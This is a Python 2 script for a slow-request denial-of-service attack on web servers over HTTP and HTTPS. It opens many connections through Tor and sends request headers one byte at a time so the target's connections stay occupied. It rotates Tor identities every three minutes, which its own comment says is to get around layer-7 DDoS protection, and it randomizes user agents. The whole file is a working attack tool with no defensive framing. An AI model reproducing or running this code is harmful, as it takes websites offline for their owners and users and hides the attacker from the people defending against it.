#-*-coding:utf8;-*-
#qpy:2
#qpy:console
#Slowread attack for HTTP and HTTPS
#Coded by SynthMesc (Freak)
#Version 1.0.0

import socket
import urlparse
import threading
import socks
import os
import ssl
from time import sleep, clock
import random

(scheme,netloc,path,params,query,fragment)=urlparse.urlparse(raw_input("Target URL: "))
threadConnections=int(raw_input("Connections per thread: "))
threads=int(raw_input("Threads: "))
print
DualHold=raw_input("Dual hold attack? (attacks both http and https ports) [y/n]:")
#<scheme>://<netloc>/<path>;<params>?<query>#<fragment>

userAgents = '''Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:5.0) Gecko/20100101 Firefox/5.0
Mozilla/5.0 (Windows NT 6.1.1; rv:5.0) Gecko/20100101 Firefox/5.0
Mozilla/5.0 (X11; U; Linux i586; de; rv:5.0) Gecko/20100101 Firefox/5.0
Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.824.0 Safari/535.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0) Gecko/20100101 Firefox/5.0
Mozilla/5.0 (Macintosh; PPC MacOS X; rv:5.0) Gecko/20110615 Firefox/5.0
Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; Media Center PC 4.0; SLCC1; .NET CLR 3.0.04320)
Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)Mozilla/5.0 (compatible; Konqueror/4.5; FreeBSD) KHTML/4.5.4 (like Gecko)
Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00O
Opera/9.80 (X11; Linux x86_64; U; fr) Presto/2.9.168 Version/11.50
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; de-at) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; da-dk) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; de-at) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1'''.split("\r\n")

def newId(): #get new tor idendity every 3 minutes to bypass l7 ddos prevention
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("127.0.0.1", 9051))
 s.send("AUTHENTICATE")
 while True:
  s.send("SIGNAL NEWNYM")
  print "[TOR] New TOR circuit created!"
  sleep(180)

def SlowreadHTTP(netloc,path,params,query,fragment, threadConnections, threadID):
 first = "GET " + path

 if params != "":
  first += "?"+params

  if query != "":
   first += "="+query

 if fragment != "":
  first += "#"+fragment
 
 first += " HTTP/1.1"

 packet = "Host: "+netloc+'''
Connection: keep-alive
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Upgrade-Insecure-Requests: 1
User-Agent: '''+random.choice(userAgents)+'''
Accept-Encoding: gzip, deflate, sdch
Accept-Language: en-UD,en-GB;q=0.8,en-US;q=0.6,en;q=0.4
Connection: Keep-Alive

''' 
 socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
 endexec = clock() + 180 #set end execution time
 connections = []
 while True:
  for i in range(threadConnections):
   try:
    s = socks.socksocket()
    s.connect((netloc,80))
    s.settimeout(10)
    connections.append(s)
    #sleep(0.025)
   except:
    pass
  print "[+]["+str(threadID)+"] "+str(len(connections))+" sockets created"
  while True:
   print "[*]["+str(threadID)+"] Sending to "+str(len(connections))+" sockets"
   for sock in connections:
    if clock() >= endexec:
     endexec = clock() + 180 #set new tor circuit time again
     sleep(random.randrange(2,9)) #wait for tor circuit to form then reconnect randomly to reduce load on tor
     print "[+]["+str(threadID)+"] New TOR circuit detected. Closing sockets."
     for sock in connections:
      sock.close()
     print "[+]["+str(threadID)+"] Refreshing sockets"
     connections = []
     for i in range(threadConnections):
      try:
       s = socks.socksocket()
       s.connect((netloc,80))
       s.settimeout(10)
       connections.append(s)
       #sleep(0.025)
      except:
       pass
     print "[+]["+str(threadID)+"] "+str(len(connections))+" sockets created"
   while True:
     for sock in connections:
      try:
       sock.send(first)
      except:
       sock.close()
      for x in packet:
       for sock in connections:
        try:
         sock.send(x)
         #sleep(0.025)
        except:
         sock.close()
         pass
        print "[.]["+str(threadID)+"] Sent byte to " + str(len(connections)) + " sockets"
        sleep(random.randrange(0,3))
      if len(connections) <= (threadConnections):
       connections = []
       for i in range(threadConnections):
        try:
         s = socks.socksocket()
         s.connect((netloc,80))
         s.settimeout(10)
         connections.append(s)
         #sleep(0.025)
        except:
         pass
       print "[+]["+str(threadID)+"] "+str(len(connections))+" sockets created"
       sleep(random.randrange(0,3))

def SlowreadHTTPS(netloc,path,params,query,fragment,threadConnections,threadID):
 first = "GET " + path

 if params != "":
  first += "?"+params

  if query != "":
   first += "="+query

 if fragment != "":
  first += "#"+fragment
 
 first += " HTTP/1.1"

 packet = "Host: "+netloc+'''
Connection: keep-alive
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Upgrade-Insecure-Requests: 1
User-Agent: '''+random.choice(userAgents)+'''
Accept-Encoding: gzip, deflate, sdch
Accept-Language: en-UD,en-GB;q=0.8,en-US;q=0.6,en;q=0.4
Connection: Keep-Alive

'''
 socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
 endexec = clock() + 180 #set end execution time
 connections = []
 while True:
  for i in range(threadConnections):
   try:
    s = socks.socksocket()
    wrappedSocket = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1, ciphers="ADH-AES256-SHA")
    wrappedSocket.connect((netloc, 443))
    wrappedSocket.settimeout(10)
    connections.append(wrappedSocket)
    #sleep(0.025)
   except:
    pass
  print "[+]["+str(threadID)+"] "+str(len(connections))+" sockets created"
  while True:
   print "[*]["+str(threadID)+"] Sending to "+str(len(connections))+" sockets"
   for sock in connections:
    if clock() >= endexec:
     endexec = clock() + 180 #set new tor circuit time again
     sleep(random.randrange(2,9)) #wait for tor circuit to form then reconnect randomly to reduce load on tor
     print "[+]["+str(threadID)+"] New TOR circuit detected. Closing sockets."
     for sock in connections:
      sock.close()
     print "[+]["+str(threadID)+"] Refreshing sockets"
     connections = []
     for i in range(threadConnections):
      try:
       s = socks.socksocket()
       wrappedSocket = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1, ciphers="ADH-AES256-SHA")
       wrappedSocket.connect((netloc, 443))
       wrappedSocket.settimeout(10)
       connections.append(wrappedSocket)
       #sleep(0.025)
      except:
       pass
     print "[+]["+str(threadID)+"] "+str(len(connections))+" sockets created"
   while True:
     for sock in connections:
      try:
       sock.send(first)
      except:
       sock.close()
      for x in packet:
       for sock in connections:
        try:
         sock.send(x)
         #sleep(0.025)
        except:
         sock.close()
         pass
       print "[.]["+str(threadID)+"] Sent byte to " + str(len(connections)) + " sockets"
       sleep(random.randrange(0,3))

     
     sleep(3)
     if len(connections) <= (threadConnections):
      connections = []
      for i in range(threadConnections):
       try:
        s = socks.socksocket()
        wrappedSocket = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1, ciphers="ADH-AES256-SHA")
        wrappedSocket.connect((netloc, 443))
        wrappedSocket.settimeout(10)
        connections.append(wrappedSocket)
        #sleep(0.025)
       except:
        pass
       print "[+]["+str(threadID)+"] "+str(len(connections))+" sockets created"

print "[+] Starting slowread attack"

newIdThread=threading.Thread(target=newId, args=())
newIdThread.start()

print "[.] Waiting for new tor circuit"

sleep(5)

for i in range(threads):
 try:
  if scheme=="http":
   attack=threading.Thread(target=SlowreadHTTP, args=(netloc,path,params,query,fragment,threadConnections, i,))
  elif scheme=="https":
   attack=threading.Thread(target=SlowreadHTTPS, args=(netloc,path,params,query,fragment,threadConnections, i,))
  
  if DualHold=="y":
   http=threading.Thread(target=SlowreadHTTP, args=(netloc,path,params,query,fragment,threadConnections, i,))
   http.start()
   https=threading.Thread(target=SlowreadHTTPS, args=(netloc,path,params,query,fragment,threadConnections, i,))
   https.start()
  else:
   attack.start()
  print "[+] Started "+str(i+1)+" threads"
 except:
  print "[-] Failed to start thread "+str(i)
  pass

print "[+] Started slowread attack!"

print "Press enter to stop."
raw_input()
os.popen("kill -9 "+str(os.getpid()))
exit(0)
